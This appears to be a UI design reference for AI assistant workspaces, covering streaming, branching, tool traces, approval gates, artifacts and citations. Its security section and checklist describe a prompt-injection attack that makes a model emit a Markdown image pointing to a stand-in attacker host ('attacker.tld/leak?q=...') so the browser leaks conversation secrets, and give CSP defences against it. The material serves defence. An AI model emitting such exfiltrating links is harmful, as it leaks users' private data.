# Agentic and AI-native workspace UI

Use this reference when designing app-owned web, desktop, or mobile AI assistant workspaces (streaming chat, tool-calling agents, reasoning traces, branching, multimodal composers, split artifact panes, citations, and approval gates) rather than host-constrained messaging bots.

## Streaming, scroll ownership, composer freedom, and resumable runs

| Behavior | Concrete rule |
|---|---|
| **Auto-scroll lock (`48–80 px`)** | Follow incoming tokens **only** while `distanceFromBottom <= 48–80 px`. The instant the user wheels/touches upward, release auto-scroll and surface a floating **`Jump to bottom`** pill. |
| **Editable composer & IME Enter guard** | **Never disable the text input (`disabled={isBusy}`) during streaming**: allow users to draft, queue, or steer mid-stream while toggling **`Send`** <-> **`Stop`** (`AbortController`); on `<textarea>` `Enter`-to-send, **always guard `if (e.isComposing || e.keyCode === 229) return;`** so CJK / Vietnamese Telex IME candidate confirmation never fires premature submission. |
| **Throttled Markdown AST (`30–50 ms` / `rAF`)** | Batch incoming SSE deltas and re-parse completed Markdown blocks at **`~30–50 ms` or `requestAnimationFrame`** (memoizing finalized paragraphs/code blocks) so 100 tok/s streams never peg the main thread at 100% CPU. |
| **Screen-reader safety** | Never attach `aria-live` to a token-by-token text node. Announce coarse milestones (`Generating response`, `Approval needed`, `Response complete`, `Stopped`) in a dedicated status region. |
| **Resumable runs, `429` & 3-part errors** | Reconnect active server runs across reloads (`resume`); render **`429` rate limits** with a live retry countdown / queued-send state; format failures as **3-part recovery cards (*What failed · Why · Next action*)** (`Retry`, `Switch model`, `Edit & resend`) without wiping drafts. |

## Conversation branching, edit-and-fork, and regeneration

- Allow users to **edit an earlier prompt** or **regenerate an assistant reply** without destroying prior output: fork a sibling branch and display a compact branch pager (`< 2 / 3 >`) inline on that turn.
- Keep artifact versions, citations, and tool traces strictly linked to the active branch so switching branches never displays stale code or files from another path.
- Confirm clearly when regenerating a turn that precedes approved external side effects (cannot un-send an already-sent email or API mutation).

## Multimodal attachments, voice input, and `@`-mention context pickers

- **Attachments (images, PDFs, audio, CSV/code)**: Render removable preview chips inside the composer showing filename, type, size/page hint, upload progress, and concrete rejection copy (oversized, unsupported MIME) while preserving typed text.
- **Voice input**: Show explicit microphone permission state, live waveform/level feedback, elapsed duration, and unambiguous `Send` vs `Cancel` controls; display editable transcript before irreversible tool-triggering prompts when accuracy matters.
- **`@`-mention context pickers**: Trigger a keyboard-accessible combobox on `@` (files, folders, docs, tables, connected tools) so users inspect and pin exact grounding scope explicitly rather than guessing what the model can see.

## Tool traces, multi-agent attribution, and context transparency

- Collapse multi-step tool calls and intermediate reasoning by default into a scannable summary (`3 tools · 1.4s`) expandable via keyboard.
- Label every step with explicit semantic state (`running`, `completed`, `failed`, `needs-approval`) using text + icon, never color or spinner alone.
- **Multi-agent attribution**: When specialized subagents or delegated workers run in parallel, attribute each trace group to its real agent role/name inside collapsible sub-cards (avoid theatrical cartoon personas or ungrounded roleplay).
- **Context-window & compaction indicator**: When a long thread approaches context limits or triggers automatic summarization/compaction, surface a calm inline indicator (*"Earlier turns compacted to stay within context · 12 files pinned"*) so users know when earlier verbatim details were summarized.
- Show real tool inputs/outputs and elapsed times only when emitted by the backend; never fake "thinking…" steps or artificial typing delays.

## Streaming Markdown, XSS, and Markdown image exfiltration defense

Model streams regularly emit **incomplete syntax** (` ```ts` without a closing fence, partial tables, unclosed `$$` math) **AND untrusted RAG / web-fetched prompt-injection payloads**:

- Use a fence-balancing streaming Markdown parser with memoized block chunks (`~30–50 ms` / `rAF`) and stable code-block headers (`language`, `Copy`, `Open in artifact`).
- **Strict HTML XSS defense**: disable raw HTML execution (`rehype-sanitize` strict schema), block `javascript:` / `data:text/html` URIs, and never pipe raw model output into `innerHTML`.
- **Markdown image data-exfiltration defense (`![](https://attacker.tld/leak?q=...)`)**: prompt-injected documents instruct the LLM to emit an invisible/external Markdown image whose query string exfiltrates secrets from the conversation the instant the browser fetches `<img>`! Block arbitrary external `<img>` auto-loads via **`Content-Security-Policy: img-src 'self' data: blob: https://trusted-cdn.example.com`** (or route through a domain-allowlisted proxy / render external URLs as **explicit user-click-to-load link cards** showing the destination domain).

## Human-in-the-loop (`HITL`) approval gates

- Before executing any irreversible, financial, credential-touching, or external mutation (sending email, updating/deleting DB rows, pushing code, charging cards), pause behind an inline approval card showing a **human-readable `Before -> After` diff + exact target resource & parameters**—**never** dump an opaque raw JSON blob and ask `"Approve tool_call?"`.
- Offer **`Approve once`**, **`Edit`** (inline parameter adjustment before run), and **`Reject`** (letting the user supply steering feedback), and lock resolved cards idempotently (`Approved by you · 14:02 UTC`) against double-clicks or replays.

## Split artifact / canvas workbench

- Open substantial generated outputs (documents, code, interactive previews, tables, diffs) in a side-by-side artifact pane on wide viewports (and a full-height sheet/tab on mobile `390px`) with independent scroll from the chat thread.
- Provide `Copy`, `Download`, version selector (`v1`, `v2`), and `Preview` / `Code` / `Diff` toggles linked to the originating turn.

## Grounded citations, warm human escalation, and data-retention privacy

- **Passage-highlighting citations**: render inline citation chips (`[1]`) that **scroll to and highlight the exact retrieved passage** inside the source preview drawer (with page/line numbers); strip or flag any model-invented URL not present in retrieved tool context.
- **Warm human-support escalation**: when confidence fails, policy blocks automation, or the user asks for a human, hand off via a **warm transfer card** that forwards a **structured conversation summary, attempted tool steps, and user metadata** to the live agent queue (showing estimated wait/SLA) so the user never has to repeat their problem from scratch.
- **Data retention, training disclosure & Thread Delete**: state clearly near the workspace header/settings whether prompts/uploads are retained or used for training (e.g. *"Zero-data-retention · Not used to train models"* or exact retention days) and provide an immediate, verifiable **Delete Thread / Purge Attachments** control.

## Verification checklist

- [ ] Scrolling up beyond `48–80 px` from bottom releases auto-scroll (`Jump to bottom`), composer stays **editable while streaming** (`Send` <-> `Stop`), and Markdown AST parses throttle at `~30–50 ms` / `rAF`;
- [ ] HTML XSS **and** untrusted Markdown image exfiltration (`![x](https://attacker.tld/...)`) are blocked via `CSP img-src` allowlist / proxy / click-to-load;
- [ ] `HITL` approval cards display human-readable **`Before -> After` diffs** (`Approve once` / `Edit` / `Reject`) idempotently;
- [ ] Inline citations scroll/highlight verified source passages and never fabricate URLs;
- [ ] **3-part recovery errors**, **`429` countdown/queue**, **context-compaction indicator**, **warm human escalation with transcript summary**, and **retention disclosure + Thread Delete** are wired;
- [ ] Split artifact pane collapses cleanly to a single-column sheet/tab at `390px` with zero horizontal overflow.
